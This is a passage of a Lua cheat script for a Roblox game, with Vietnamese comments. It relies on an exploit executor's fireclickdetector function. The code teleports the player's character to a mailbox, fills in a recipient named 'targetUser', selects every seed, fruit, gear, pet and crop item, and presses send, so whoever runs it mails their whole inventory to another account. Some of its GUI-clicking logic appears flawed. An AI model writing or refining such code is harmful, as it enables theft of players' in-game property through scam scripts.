-- Đợi nhân vật
local function waitForCharacter()
    local char = player.Character
    if not char then
        char = player.CharacterAdded:Wait()
    end
    return char
end

-- Dịch chuyển về nhà
local function teleportToHome()
    local char = waitForCharacter()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    
    local spawn = workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChild("Spawn")
    if not spawn then
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("SpawnLocation") then
                spawn = v
                break
            end
        end
    end
    
    if hrp and spawn then
        hrp.CFrame = spawn.CFrame + Vector3.new(0, 5, 0)
        wait(0.5)
    end
end

-- Di chuyển sang phải và tương tác
local function moveRightAndInteract()
    local char = waitForCharacter()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    
    if hrp then
        for i = 1, 40 do
            hrp.CFrame = hrp.CFrame + Vector3.new(1, 0, 0)
            
            -- Kiểm tra vật thể tương tác
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") and v:FindFirstChildOfClass("ClickDetector") then
                    local dist = (v.Position - hrp.Position).Magnitude
                    if dist < 5 then
                        local detector = v:FindFirstChildOfClass("ClickDetector")
                        if detector then
                            fireclickdetector(detector)
                            wait(0.3)
                        end
                    end
                end
                
                -- Tìm hòm thư
                if v:IsA("BasePart") and (v.Name:lower():find("mailbox") or v.Name:lower():find("mail")) then
                    local dist = (v.Position - hrp.Position).Magnitude
                    if dist < 10 then
                        hrp.CFrame = v.CFrame + Vector3.new(0, 3, 0)
                        wait(0.5)
                        
                        local detector = v:FindFirstChildOfClass("ClickDetector")
                        if detector then
                            fireclickdetector(detector)
                            wait(1)
                            return true
                        end
                    end
                end
            end
            
            wait(0.05)
        end
    end
    return false
end

-- Gửi đồ qua hòm thư
local function sendItemsToTarget()
    wait(1)
    
    local playerGui = player:WaitForChild("PlayerGui")
    
    -- Tìm GUI hòm thư
    local mailGui = nil
    for _, v in pairs(playerGui:GetChildren()) do
        if v:IsA("ScreenGui") then
            local name = v.Name:lower()
            if name:find("mail") or name:find("send") or name:find("gift") then
                mailGui = v
                break
            end
        end
    end
    
    if mailGui then
        -- Nhập tên người nhận
        for _, v in pairs(mailGui:GetDescendants()) do
            if v:IsA("TextBox") then
                v.Text = targetUser
                wait(0.3)
                break
            end
        end
        
        -- Chọn tất cả vật phẩm
        for _, v in pairs(mailGui:GetDescendants()) do
            if v:IsA("ImageButton") or v:IsA("TextButton") then
                local name = v.Name:lower()
                if name:find("seed") or name:find("fruit") or name:find("gear") or name:find("pet") or name:find("item") or name:find("crop") then
                    local detector = v:FindFirstChildOfClass("ClickDetector")
                    if detector then
                        fireclickdetector(detector)
                        wait(0.02)
                    end
                end
            end
        end
        
        -- Bấm nút gửi
        for _, v in pairs(mailGui:GetDescendants()) do
            if v:IsA("TextButton") or v:IsA("ImageButton") then
                local text = v.Text:lower()
                if text:find("send") or text:find("gửi") or text:find("confirm") then
                    local detector = v:FindFirstChildOfClass("ClickDetector")
                    if detector then
                        fireclickdetector(detector)
                        break
                    end
                end
            end
        end
        
        -- Tìm nút màu xanh
        for _, v in pairs(mailGui:GetDescendants()) do
            if v:IsA("TextButton") or v:IsA("ImageButton") then
                local bgColor = v.BackgroundColor3
                if bgColor.R < 0.1 and bgColor.G > 0.5 and bgColor.B < 0.1 then
                    local detector = v:FindFirstChildOfClass("ClickDetector")
                    if detector then
                        fireclickdetector(detector)
                        break
                    end
                end
            end
        end
    end
end

